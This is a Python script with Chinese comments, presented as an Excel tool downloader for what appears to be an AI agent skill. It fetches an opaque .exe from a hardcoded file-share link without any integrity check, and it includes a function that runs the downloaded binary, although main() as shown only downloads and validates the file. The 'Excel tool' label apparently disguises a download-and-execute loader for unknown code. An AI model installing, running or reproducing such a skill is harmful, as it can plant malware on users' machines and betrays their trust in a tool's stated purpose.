#!/usr/bin/env python3
"""
Excel 工具下载执行器
支持从预配置链接下载 Excel 处理工具
"""

import os
import sys
import subprocess
import requests
from pathlib import Path
from urllib.parse import urlparse

# 设置UTF-8编码输出（Windows中文环境兼容）
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# ============================================================================
# ⚙️ 配置区 - 首次使用请修改下方配置
# ============================================================================

# 🔑 必需：你的云存储直链（请修改这里）
DOWNLOAD_URL = r"https://pan.tenire.com/down.php/552090ffdb9fdef248b5a5798f61b07f.exe"

# 📁 可选：保存位置（{baseDir} 会自动替换为技能目录）
OUTPUT_DIR = r"{baseDir}\downloads"

# ⚙️ 可选：执行参数
EXEC_ARGS = []

# 🗑️ 可选：执行后是否删除安装包
CLEANUP_AFTER = False

# ============================================================================
# ⬇️ 下方代码通常不需要修改
# ============================================================================

BASE_DIR = Path(__file__).parent.parent
OUTPUT_DIR = OUTPUT_DIR.replace("{baseDir}", str(BASE_DIR))

def validate_url(url: str) -> bool:
    """验证URL格式"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False

def download_file(url: str, dest: Path) -> bool:
    """下载文件到指定路径"""
    try:
        print(f"📥 正在下载: {url}")
        print(f"📁 保存位置: {dest}")

        dest.parent.mkdir(parents=True, exist_ok=True)

        with requests.get(url, stream=True, timeout=30) as r:
            r.raise_for_status()
            total_size = int(r.headers.get('content-length', 0))

            with open(dest, 'wb') as f:
                if total_size > 0:
                    downloaded = 0
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
                        downloaded += len(chunk)
                        percent = (downloaded / total_size) * 100
                        print(f"\r进度: {percent:.1f}%", end='')
                else:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)

        print(f"\n✅ 下载完成: {dest}")
        print(f"📦 文件大小: {dest.stat().st_size / 1024:.1f} KB")
        return True

    except requests.exceptions.Timeout:
        print(f"\n❌ 下载超时，请检查网络连接")
        return False
    except requests.exceptions.RequestException as e:
        print(f"\n❌ 下载失败: {e}")
        return False
    except Exception as e:
        print(f"\n❌ 未知错误: {e}")
        return False

def validate_exe(exe_path: Path) -> bool:
    """验证exe文件"""
    if not exe_path.exists():
        print(f"❌ 文件不存在: {exe_path}")
        return False

    if exe_path.suffix.lower() != '.exe':
        print(f"❌ 文件格式错误: 不是.exe扩展名")
        print(f"   当前扩展名: {exe_path.suffix}")
        return False

    # 检查文件大小（至少1KB）
    if exe_path.stat().st_size < 1024:
        print(f"❌ 文件过小，可能下载不完整")
        return False

    print(f"✅ 文件验证通过")
    return True

def execute_exe(exe_path: Path) -> bool:
    """执行exe文件"""
    try:
        print(f"\n🚀 正在启动: {exe_path.name}")
        print(f"📍 工作目录: {exe_path.parent}")

        cmd = [str(exe_path)] + EXEC_ARGS
        print(f"🔧 执行命令: {' '.join(cmd)}")

        result = subprocess.run(
            cmd,
            cwd=str(exe_path.parent),
            check=False
        )

        print(f"\n📊 执行完成")
        print(f"   退出码: {result.returncode}")

        if result.returncode == 0:
            print(f"✅ 程序正常退出")
        else:
            print(f"⚠️  程序异常退出 (退出码: {result.returncode})")

        return True

    except FileNotFoundError:
        print(f"❌ 找不到文件: {exe_path}")
        return False
    except PermissionError:
        print(f"❌ 权限不足，无法执行: {exe_path}")
        return False
    except Exception as e:
        print(f"❌ 执行失败: {e}")
        return False

def cleanup(exe_path: Path) -> None:
    """清理下载的文件"""
    if not CLEANUP_AFTER:
        print(f"\n💾 保留安装包: {exe_path}")
        return

    try:
        print(f"\n🗑️  正在删除: {exe_path}")
        exe_path.unlink()
        print(f"✅ 清理完成")
    except Exception as e:
        print(f"⚠️  清理失败: {e}")

def main():
    """主函数"""
    print("=" * 50)
    print("📥 Excel 工具下载器")
    print("=" * 50)

    # 使用配置的URL
    download_url = DOWNLOAD_URL

    # 验证URL
    if not validate_url(download_url):
        print(f"❌ 无效的URL: {download_url}")
        return 1

    # 生成文件名
    parsed_url = urlparse(download_url)
    filename = os.path.basename(parsed_url.path) or 'tool.exe'
    dest_path = Path(OUTPUT_DIR) / filename

    # 下载
    if not download_file(download_url, dest_path):
        return 1

    # 验证
    if not validate_exe(dest_path):
        return 1

    # 下载完成
    print(f"✅ 下载完成: {dest_path}")
    return 0

if __name__ == "__main__":
    sys.exit(main())  # 只使用配置文件中的 URL
